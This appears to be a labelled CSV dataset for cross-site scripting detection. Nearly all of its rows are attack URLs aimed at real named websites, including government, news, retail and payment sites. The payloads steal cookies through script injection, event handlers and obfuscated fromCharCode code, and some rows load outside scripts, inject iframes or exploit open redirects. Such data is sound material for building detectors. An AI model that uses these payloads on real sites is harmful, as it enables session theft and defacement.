Sentence,Label
http://cci.lbl.gov/cctbx/cctbx_web.cgi?target_module=explore_symmetry&amp;sgsymbol=p+1+c+1%27%22%3e%3c/t<br>itle%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3cscript%20src=%22http://www.securitycode.it/<br>x.js%22%3e%3c/scrpt%3e,1
https://www.donhr.navy.mil/search_index.asp?strsearchquery=%22%22%2f%2f%3e%3cscript%3ealert(document<br>.cookie)%3b%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+xados%3ch1%3e%3c%2fmarquee%3e&amp;action=search&amp;st<br>rtypeofsearch=w,1
http://www.thomsonscientific.com/cgi-bin/jrnlst/jlresults.cgi?pc=j&amp;alpha=x%22%3e%3cscript%3ealert(do<br>cument.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,1
"http://www.rai.it/rainet/common/articolo/rairedirectvisualizzaarticolo/1,2308,,00.html?canale=1%22%3<br>e%27%27%3e%3cbody%20background=javascript:%27%22%3e%3cscript%3ealert(navigator.useragent)%3c/script%<br>3e%3e%3c/body%3e",1
http://www.politicheagricole.gov.it/motorericerca/risultati?txtquery1=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e&amp;submit=cerca%26<br>aaaa=byxados,1
http://store.corriere.it/prodotto/9568-c004/%22%3e%3e/byxados/%3cscript%3ealert(document.cookie)%3c/<br>script%3e/1/prime-pagine-corriere/catalogo/imprese-e-scoperte/il-primo-trapianto-di-cuore-della-stor<br>ia.html,1
http://www.spt.mef.gov.it/servizi_informativi/motore_di_ricerca/risultato?path_part=&amp;text=%3cimg+src<br>%3dfoo.png+onerror%3dalert(%2fxssed%2f)+%2f%3e&amp;criteria=content&amp;criteria1=and&amp;ricercaattiva=y&amp;submit<br>1=ricerca,1
http://www.nasa-academy.org/db/yearbookview.php?id=%22%3e/xados/%3e%3cscript%3ealert(document.cookie<br>)%3c/script%3e%3cscript%20src=http://www.securitycode.it/x.js%3e%3c/script%3e,1
http://www.senato.it/ricerche/avanzata/nuova.ricerca;jsessionid=300338248acd2059104a61355b2ba6f0?sea<br>rchid=&quot;&gt;''/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;script<br>src=&quot;htpp://www.securitycode.it/x.js&quot;&gt;&lt;/script&gt;,1
http://www.navyenterprise.navy.mil/docs/pdf/pdf.aspx?keepthis=true&amp;path_to_file=http://xssed.com&amp;tb_<br>iframe=true&amp;height=550&amp;width=800,1
http://newrassegna.camera.it/chiosco_new/pagweb/inviaarticolo.asp?articlecurrent=906039%22%3e%3cscri<br>pt%3ealert(document.cookie)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,1
http://coordinamento.mininterno.it/servpub/ver2/scar/ricerca_targa.asp?numerotarga=%22%3e%3cscript%3<br>ealert(document.cookie)%3c/script%3e&amp;numerotelaio=%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%20%3ch<br>1%3e%3c/marquee%3e,1
http://it.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cook <br>ie)%3c/script%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,1
http://pcatdwww.cern.ch/atlas-point1/operref.php?subs=http://www.xssed.com,1
http://alphatest.repubblica.it/errore.php?sql=--xados--%3cscript%3ealert%28document.cookie%29%3c/scr<br>ipt%3e%3ciframe%20src=%22http://www.xssed.com%22%20width=%221000%22%20height=%221000%22%3e%3c/iframe<br>%3e,1
http://annunci.repubblica.it/italia/tutti/-/ricerca-%22%3e%3cbody%20onload=alert%28%27xados%5bat%5dh<br>otmail%5bdot%5dit%27%29%3e,1
http://www.cell.com/searchresults?searchby=fulltext&amp;searchtext=%3c%2fstyle%3e%3cscript%3ea%3deval%3b<br>b%3dalert%3ba(b(%2fxss%20by%20xados%2f.source))%3b%3c%2fscript%3e%27%22%3e%3cmarquee%3e%3ch1%3e%22%3<br>e%3cscript%3ealert(document.cookie)%3c%2fscript%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit_search=search,1
http://finance.aol.com/usw/quotes/stockscreener?c_mc=cust&amp;c_mc_f=100b!!!(hey%20admin!)%22%3e%3cscrip<br>t%3ealert(document.cookie)%3c/script%3e&amp;c_mc_t=500b%22%3e%3cbody%20background=javascript:%27%22%3e%3<br>cscript%3ealert(navigator.useragent)%3c/script%3e%3e%3c/body%3e&amp;f_per=cust&amp;f_per_f=0&amp;f_per_t=15&amp;r_dv<br>=&amp;r_nor=5&amp;r_off=0&amp;s_off=0by_xados&amp;symbols_together=pg,1
http://oroscopo.seidimoda.repubblica.it/zodiaco.php?segno=%22%3e%3cmarquee%3e%3cscript%3ealert%28doc<br>ument.cookie%29%3c/script%3e%3c/marquee%3e,1
http://dweb.repubblica.it/dettaglio/lautunno-del-benessere/25687?type=//xados--%3e%22%3e%3cscript%3e<br>alert%28document.cookie%29%3c/script%3e%3ciframe%20src=%22http://www.xssed.com%22%3e%3c/iframe%3e,1
http://annunci.repubblica.it/data/uploadattachment.php?type=322667%22%3e%3cscript%3ealert(document.c<br>ookie)%3c/script%3e,1
http://www.radio24.ilsole24ore.com/main.php?dirprog=%22%3e%3cscript%3ealert%28document.cookie%29%3c/<br>script%3e,1
http://us.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,1
http://de.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,1
http://fr.ask.com/blogsearch?q=ss&amp;t=n&amp;s=r&amp;bql=it%22/xados/%3e%3cscript%3ealert(document.cookie)%3c/s<br>cript%3e|--%3cmarquee%3e%3ch3%3exss%20by%20xados%3ch3%3e%3c/marquee%3e,1
http://testkontakt.npd.de/formular.php?write=1&amp;vorname=%22%3e%3cscript%3ealert(1);%3c/script%3e,1
http://www.silicon.de/enid/mein_silicon?username=%22%3e%3cscript%3ealert(1);%3c/script%3e,1
http://kb.paragon-software.com/paragon/templ/372.jsp?build=%22%3e%3cscript%3ealert(1);%3c/script%3e,1
http://www.scene.org/error.php?e=password&amp;login=\%22%3e%3cscript%3ealert(1);%3c/script%3e,1
http://lists.avira.com/lists/index.php?email=%22+onmouseover=alert(1)+,1
http://www.claranet.de/kontakt/feedback/feedback.html?em=%22%3e%3cscript%3ealert(1);%3c/script%3e,1
http://www.paragon-software.com/newsletters_subscription.html?email_address=%22%3e%3cscript%3ealert(<br>1);%3c/script%3e,1
https://customers.reuters.com/cspsec_login/login.asp?failed=1&amp;user=%22%3e%3cscript%3ealert(1);%3c/sc<br>ript%3e,1
https://www.otto.de/is-bin/intershop.enfinity/wfs/otto-ottode-site/de_de/-/eur/ov_viewtemplate-view;<br>sid=23=?emailaddress=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;template=extendedlogin%2fpopups%2f<br>popup_forgot_password_cont,1
http://www.ciao.de/sr/q-%22%3e%3cscript%3ealert%281%29%3b%3c/script%3e,1
http://www.colt.net/de/ge;internal&amp;action=search.action?searchstring=%22%3e%3cscript%3ealert(1);%3c/<br>script%3e,1
http://www.rackspacecareers.com/index.php?page=contactus&amp;processed=true,1
http://www.esa.int/esa-mmg/mmg.pl?keyword=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,1
http://www.mapquest.com/maps/map.adp?formtype=address&amp;country=us&amp;popflag=0&amp;latitude=&amp;longitude=&amp;name<br>=&amp;phone=&amp;level=&amp;addtohistory=&amp;cat=%22%3e%3cscript%3ealert(%2f%5c'the-sh0ck-b0y-www.rootingforced.org<br>%5c'%2f)%3c%2fscript%3e&amp;address=&amp;city=&amp;state=&amp;zipcode=,1
http://feeds.my.aol.com/landing.jsp?u=http://www.rootingforced.org;keyword=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,1
http://shopping.aol.com/ppesearch/ppsearch?&amp;k=%22%3e%3cscript%3ealert(%2f%5c'the-sh0ck-b0y-www.rooti<br>ngforced.org%5c'%2f)%3c%2fscript%3e,1
http://search.netscape.com/search/search?invocationtype=topsearchbox.search&amp;query=%22%3e%3cscript%3e<br>alert%28%2f%5c%27the-sh0ck-b0y-www.rootingforced.org%5c%27%2f%29%3c%2fscript%3e,1
http://sourceforge.net/project/downloading.php?groupname=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&amp;f<br>ilename=wamp5_1.7.1a.exe&amp;use_mirror=heanet,1
http://www.macres.gov.my/acrs2007/uploadform.asp?msg=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://www.templatehelp.com/preset/cart.php?act=add&amp;templ=15223&amp;pr_code=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b<br>0y/)&lt;/script&gt;,1
http://www.ekolay.net/haber/category.asp?pid=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://ad.e-kolay.net/redir.a2?ciid=32261&amp;tid=3472&amp;url=http://www.theshockboy.tr.cx,1
http://adonline.e-kolay.net/clk.asp?rid=4532&amp;tid=103&amp;url=http%3a//theshockboy.tr.cx&amp;cookieenabled=tr<br>ue,1
http://clk.atdmt.com/msn/go/msnnkwsp0050000001msn/direct/01/?href=http://www.theshockboy.tr.cx?ocid=<br>msnhp,1
http://www.ekolay.net/kadin/ana_detay.asp?pid=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://www.kraloyun.com/index.php?nav=kategori&amp;cat_id='&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://search.hp.com/redirect.html?type=pop&amp;url=http://theshockboy.tr.cx,1
http://search.sweetim.com/search.asp?src=2&amp;q='&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://www.ntvmsnbc.com.tr/ads/adredir.asp?ciid=13235&amp;crid=13246&amp;url=http://www.theshockboy.tr.cx,1
http://www.ntvmsnbc.com/ads/adredir.asp?ciid=13235&amp;crid=13246&amp;url=http://www.theshockboy.tr.cx,1
http://www.simplemachines.org/adsystem/adclick.php?bannerid=32&amp;zoneid=3&amp;source=&amp;dest=http://www.thes<br>hockboy.tr.cx,1
http://www.ogame.com.es/screenshot.php?pic=battleship_1280x1024&amp;type=php&amp;path=h&quot;&gt;&lt;/img&gt;&lt;script&gt;alert<br>(/the-sh0ck-b0y/)&lt;/script&gt;,1
http://eglence.msn.com.tr/astroloji.asp?url=http://www.theshockboy.tr.cx,1
http://members.diaryland.com/edit/viewnav.phtml?user=%3cscript%20src=http://vuln.xssed.net/thirdpart<br>y/scripts/sshjason.js%3e%3c/script%3e%3cimg%20src=http://images.diaryland.com/diarylandmembersarealo<br>go.gif%20onload=xss()%3e,1
http://www.ogame.com.es/register.php?lang=de&amp;result=mistake&amp;error[0]=nr27&amp;error[1]=nr26&amp;error[2]=nr2<br>5&amp;error[3]=nr23&amp;uni_name=9&amp;character=&quot;&gt;&lt;script&gt;alert(/the-sh0ck-b0y/)&lt;/script&gt;&amp;email=&amp;try=2&amp;errornam<br>e=1&amp;errormail=1&amp;erroragb=1&amp;errorpw=1,1
https://sourceforge.net/top/mostactive.php?type=f00&quot;&gt;&lt;script&gt;alert(&quot;xssed&quot;);&lt;/script&gt;,1
http://www.thinkgeek.com/brain/whereisit.cgi?t=%22%3e%3cscript%3ealert%28%27xssed%27%29%3b%3c%2fscri<br>pt%3e,1
"http://search.president.ir/search.php?term=f00z%3cscript%3edocument.write(string.fromcharcode(60,115<br>,99,114,105,112,116,62,97,108,101,114,116,40,34,65,104,109,97,100,105,110,101,106,97,100,44,32,112,9<br>7,119,110,51,100,33,32,71,111,32,115,117,99,107,32,109,121,32,46,46,46,46,46,34,41,59,60,47,115,99,1<br>14,105,112,116,62,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,119,119,119<br>,46,98,114,101,105,116,98,97,114,116,46,99,111,109,47,97,114,116,105,99,108,101,46,112,104,112,63,10<br>5,100,61,48,54,49,50,49,49,49,51,48,50,53,55,46,121,112,102,107,122,112,53,98,38,115,104,111,119,95,<br>97,114,116,105,99,108,101,61,49,34,32,119,105,100,116,104,61,34,49,50,48,48,112,120,34,32,104,101,10<br>5,103,104,116,61,34,49,48,48,48,112,120,34,62,60,47,105,102,114,97,109,101,62))%3c/script%3e&amp;cs=1&amp;ke<br>yphrase=all&amp;langid=fa&amp;x=0&amp;y=0",1
"http://www.president.ir/en/view.php?p=1&amp;m=0&amp;c=35&amp;y=2007&amp;m=%22%3cscript%3edocument.write(string.fromc<br>harcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,65,104,109,97,100,105,110,101,106,97,1<br>00,32,112,64,119,110,100,46,32,89,111,117,32,99,97,110,32,115,117,99,107,32,109,121,32,46,46,46,34,4<br>1,59,60,47,115,99,114,105,112,116,62,60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,5<br>8,47,47,119,119,119,46,98,114,101,105,116,98,97,114,116,46,99,111,109,47,97,114,116,105,99,108,101,4<br>6,112,104,112,63,105,100,61,48,54,49,50,49,49,49,51,48,50,53,55,46,121,112,102,107,122,112,53,98,38,<br>115,104,111,119,95,97,114,116,105,99,108,101,61,49,34,32,119,105,100,116,104,61,34,49,48,48,48,112,1<br>20,34,32,104,101,105,103,104,116,61,34,49,50,48,48,112,120,34,62,60,47,105,102,114,97,109,101,62))%3<br>c/script%3e",1
http://www.leader.ir/langs/en/index.php?p=search&amp;q=%3cbody%20onload=%22document.images[1].src='http:<br>//img82.imageshack.us/img82/3552/hypnotoad2rg.jpg';alert('if%20we%20cant%20live%20in%20peace%20then%<br>20lets%20die%20in%20peace.%20we%20are%20not%20committing%20suicide-its%20a%20revolutionary%20act.%20<br>--jim%20jones')%22,1
http://www.pcworld.com/search?qt=mew&amp;col=f00%22%3e%3cscript%3ealert('xss%20from%20sshjason');%3c/scr<br>ipt%3e&amp;sort=date,1
http://www.digium.com/elqnow/elqredir.htm?ref=javascript:alert('xss%20from%20sshjason'),1
http://www.un.org/pubs/cyberschoolbus/infonation3/topic_blue-chart_loader.asp?cat=1&amp;stat1=73&amp;stat2=7<br>3&amp;stat3=73&amp;stat4=73&amp;stat5=73&amp;stat6=f00z&quot;&gt;&lt;script&gt;alert('xssed%20by%20sshjason');&lt;/script&gt;,1
"http://www.vietnam.gov.vn/portal/page?_pageid=33,127911&amp;_dad=portal&amp;_schema=portal",1
http://saos.nictusa.com/saos/searchao?submit=continue&amp;keywords=aa&amp;aonum=&quot;&gt;f00zbar'&lt;img<br>src=&quot;foo.jpg&quot;onerror=&quot;alert(document.cookie)&quot;&gt;&amp;reqname=&amp;currstate=fec.saos.gui.basicsearch&amp;childsess<br>ion=0,1
http://origins.usa.gov/external/external.jsp?url=javascript:alert('xssed%20by%20sshjason'),1
http://www.sun.com/download/index.jsp?cat=patches%3cscript%3ealert('xss');%3c/script%3e&amp;tab=3,1
http://hatch.senate.gov/index.cfm?f00z&quot;style=&quot;width:expression(alert('xss'));&quot;&gt;,1
http://www.hojo.com/howardjohnson/control/booking/property_info?propertyid=f00z%22;--%3e%3c/script%3<br>e%3cscript%3ealert('xssed%20from%20sshjason');%3c/script%3e&amp;brandinfo=hj&amp;cid=%eaid!,1
http://esupport.trendmicro.com/support/help/en_us/%3cscript%3ealert('xss%20from%20sshjason');%3c/scr<br>ipt%3e,1
http://www.cbp.gov/xp/cgov/printme.xml?xml=$/content/import/duty_rates_hts/drawback/texport.ctt&amp;loca<br>tion=%22%3cscript%3ealert('xss%20from%20sshjason');%3c/script%3e,1
https://shopping.discovery.com/stores/servlet/directemailsignup?langid=-1&amp;krypto=yk9tiivlbtrqkjzpqpe<br>93gn2llsxvtjkdmq2nbevj3xmc%2bhtt4mntswsiznchyn9j%2fl6slqpz23d%0a%2fgugenud5qhaa97x9wecxlzbhrrf95ulpk<br>cckzpjj3eeorkjnvqzfowo8%2bmv2j0kf95xz1ym3mkn%0aqws19a%2fm8sgkmmdekatddv5vywurwc5w6xcbili4bubqcr1rwto<br>bmtsohlkjp%2ffa3sadqnjm0fjc%0aoulvdja%3d,1
http://www.starbucksstore.com/products/shprodli.asp?keywords=%3c%2ftitle%3e%3cscript%3ealert%28%27xs<br>sed%27%29%3b%3c%2fscript%3e,1
http://www.toysrus.com/search/noresults.jsp?kw=f00zbar--';alert('xssed');var%20bar=',1
http://www.cissp.com/store/search.asp?s=%22%3cscript%3ealert('xss%20froms%20sshjason');%3c/script%3e<br>&amp;c=135315,1
http://searchcgi.apple.com/cgi-bin/sp/nph-searchpre11.pl?q=foo&amp;output=xml_no_dtd&amp;client=default_fron<br>tend&amp;site=us_only&amp;lr=lang_en&amp;sort=&amp;start=&amp;access=p&amp;oe=utf-8--%3e%3cscript%3ealert('xssed')%3c/script<br>%3e,1
http://store.esri.com/esri/search.cfm?sid=2&amp;keywords=fooz%22%3cscript%3ealert('xssed');%3c/script%3e,1
http://www.careerbuilder.com/pli/quicksrchv2.asp?siteid=cbcnn160&amp;lr=cbcnn&amp;qssts=ca%2cus&amp;searchbtn=se<br>arch&amp;mxjobsrchcriteria_jobtypes=jn008&amp;qskwd=f00z&amp;qscty=%3cscript%3ealert('xssed');%3c/script%3e&amp;cbre<br>cursioncnt=2&amp;cbsid=28242bd615324823ad7934c3e87618c4-244928439-x0-2,1
http://my.barackobama.com/page/event/search_results?type=advanced&amp;orderby=day&amp;state=%27};alert(%27xs<br>sed%27);currentsearch={foo:%27,1
http://searchhbo.hbo.com/pages/search/basic.jsp?querysubmit=true&amp;page=%27%22-1f00z--%3e%3cscript%3ea<br>lert(1);%3c/script%3e,1
http://members.freewebs.com/sent.jsp?emailaddress=&lt;script&gt;alert(1)&lt;/script&gt;,1
http://zonealarm.com/store/content/support/support.jsp?dc=&quot;;alert('xss');a=&quot;,1
http://us.imdb.com/register/?why=mymovies;ref=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
http://home.bellsouth.net/s/s.dll?spage=a&lt;script&gt;alert(1)&lt;/script&gt;,1
http://sites.target.com/site/en/spot/store_locator_new.jsp?&amp;startaddress=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;&quot;,1
http://tinypic.com/search.php?tag=&lt;iframe src=&quot;&quot; width=900 height=600 onmouseover=alert('xss')&gt;,1
http://www.walgreens.com/library/default.jsp?tab=%27%3balert%281%29%3ba%3d%27,1
http://www.kmart.com/shc/s/p_10151_10104_6174302200000000p?vname=&quot;&gt;&lt;body onload=alert(/xss/)&gt;,1
http://csd.toshiba.com/cgi-bin/tais/su/su_sc_domlog.jsp?cnum=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,1
http://www.tigerdirect.ca/applications/email/d_error.asp?email=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,1
http://nytimes.com/gst/litesub_insert.html?product=my&amp;size=336x90&amp;email=&quot;<br>&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;&quot;,1
"http://informationsecurity.techtarget.com/ismsearch/1,295480,sid42,00.html?sint_q=&quot;&gt;&lt;script&gt;alert(1)<br>&lt;/script&gt;&lt;&quot;",1
http://shopnbc.com/errors/500-100.asp?aspxerrorpath=&lt;script&gt;alert(1)&lt;/script&gt;,1
http://us.ebayobjects.com/6k%3bh=v8/354f/3/0/%2a/t%3b99910185%3b1-0%3b0%3b12474888%3b18339-740/414%3<br>b20841176/20859069/1%3b%3b%7eaopt%3d2/1/ff/0%3b%7esscs%3d%3fhttp://us.ebayobjects.com/2c;99860803;12<br>593038;r?http://phish.com,1
http://www.easywarez.com/index.php?act=search&amp;fid=8888&amp;search=&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt;,1
https://store.apple.com/1-800-my-apple/webobjects/applestore.woa/6854001/wo/bb5kzqjormse27b33ac1junn<br>4x1/3.0.23.7.5.1.1.0.1,1
http://photobucket.com/images/%22%3e%3cbody%20onload=alert(142);%3e/,1
https://secure.ipowerweb.com/cgi-bin/hosting/signup.cgi?domain=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;input<br>type=&quot;hidden,1
http://secondlife.com/community/search.php?search_terms=&quot;onmouseover=alert(1);+a=&amp;search_type=all,1
"http://thepiratebay.org/search/\&quot;onmouseover=\&quot;alert(\'142teeth was<br>here.\\n\\nwhitehouse.net\\naroundthebox.org\');/0/0/100,200,300,400,600",1
https://www.comcast.com/corporate/customers/customercentral.html?errormessage=&lt;iframe<br>src=http://www.fbi.gov&gt;,1
http://www.paypal.com/helpcenter/main.jsp?t=browsetab&amp;ft=browsetab&amp;opentopic=&lt;/span&gt;&lt;/div&gt;&lt;img<br>src=&quot;&quot; onerror=&quot;javascript:alert('www.aroundthebox pwnz<br>1');&quot;&gt;&lt;/body&gt;&amp;topictreeid=null&amp;showcontent=true&amp;lstlanguageresults=en_us&amp;locale=en_us&amp;_dyncharset=ut<br>f-8&amp;cmd=_help-ext,1
http://www.paypal.com/helpcenter/main.jsp?t=browsetab&amp;ft=browsetab&amp;opentopic=20009&amp;topicname=xss&quot;);alert('www.aroundthebox.org pwnz<br>2');a(&quot;&amp;topictreeid=null&amp;showcontent=true&amp;lstlanguageresults=en_us&amp;locale=en_us&amp;_dyncharset=utf-8&amp;cm<br>d=_help-ext,1
http://wap.aol.com/portal/jsp/options.jsp?returl=&quot;&gt;&lt;script&gt;alert(142)&lt;/script&gt;&lt;a b=&quot;,1
http://mx.isti.cnr.it/cgi-bin/conan?key=cc~messages~errormessage&amp;title=vms%20help&amp;referer=&quot;&gt;&lt;script&gt;<br>alert('=xssbydt=')&lt;/script&gt;,1
http://www.bcsc.bc.ca/error.asp?errormessage=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script&gt;,1
http://biz.thestar.com.my/members/loginerror.asp?code=1202&amp;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,1
http://www.airasia.com/amazing/en/page.php?menu=one&amp;content=&quot;+onmouseover=alert('xssbydt')+,1
http://www.lelong.com.my/auc/wanted/mailthistoafriendaction.asp;msg=&lt;script&gt;alert(&quot;xssbydt&quot;)&lt;/script&gt;,1
http://biz.thestar.com.my/members/login.asp?searchstr=&quot;&gt;&lt;script&gt;alert('=xssbydt=')&lt;/script&gt;&amp;vcid=biz<br>32,1
http://list.lelong.com.my/auc/list/list.asp?da=a&amp;thekeyword='&gt;&lt;body%20onload=alert(12307)&gt;&amp;categoryi<br>d=&amp;myauctiontype=1,1
http://www.thesundaily.com/search.cfm?q=&quot;&gt;&lt;script&gt;alert('xssbydt')&lt;/script&gt;&amp;submit.x=4&amp;submit.y=5,1
http://members.lelong.com.my/auc/help/search.asp?categoryid=15&amp;search=&quot;&gt;&lt;body%20onload=alert(&quot;xssbyd<br>t&quot;)&gt;&amp;submit=+go%21+,1
http://www.lelong.com.my/bbs/emailfriend.asp?forum=%uff1e%uff02%uff1exxx%uff1cscript%uff1ealert('=xs<br>sbydt=')%3b%uff1c/script%uff1e&amp;amp%3bid=aaa&amp;amp%3bsubject=administrator%2babusing%2bright%2b%252f%2b<br>downloading%2bservices&amp;amp%3btype=all,1
http://www.lelong.com.my/promo/ladies/gallery.asp?thread_parent=919&amp;token=%uff1e%uff02%uff1exxx%uff1<br>cscript%uff1ealert('=xssbydt=')%3b%uff1c/script%uff1e,1
http://www.lelong.com.my/bbs/pop_messengers.asp?mode=icq&amp;icq=&lt;div+style=&quot;width:expression(alert('=xs<br>sbydt='))%3b&quot;&gt;&amp;m_name=brainocide,1
http://www.tm.net.my/tmnet2006/contents/products-services/search.cfm?criteria=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;al<br>ert('=xssbydt=')%3b&lt;/script&gt;&amp;search_in=product&amp;submit=search,1
http://www.tm.net.my/tmnet2006/contents/products-services/products.cfm?prodid=50&amp;type=&gt;&quot;&gt;&lt;script%20%<br>0a%0d&gt;alert('=xssbydt=')%3b&lt;/script&gt;,1
http://my.lgmobile.com/web/web.etc.totalsearch.laf?srchrange=all&amp;srchword==&gt;'&gt;&lt;script%20%0a%0d&gt;alert<br>('=xssbydt=')%3b&lt;/script&gt;,1
http://www.tm.net.my/tmnet2006/contents/online/eregistration.cfm?ms=5&amp;type=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert<br>('=xssbydt=')%3b&lt;/script&gt;,1
http://sams.tm.net.my/customercenter/index.asp?err_msg=&lt;script&gt;alert('=xssbydt=')&lt;/script&gt;,1
http://my.lgmobile.com/web/web.news.retrievenewslist.laf?snewssearchtype=stitle&amp;skeyword=%22%3e%3c%2<br>fxss%2f*-*%2fstyle%3dxss%3ae%2f**%2fxpression%28alert%28%27%3dxssbydt%3d%27%29%29%3e&amp;targetrow=&amp;noti<br>ceid=,1
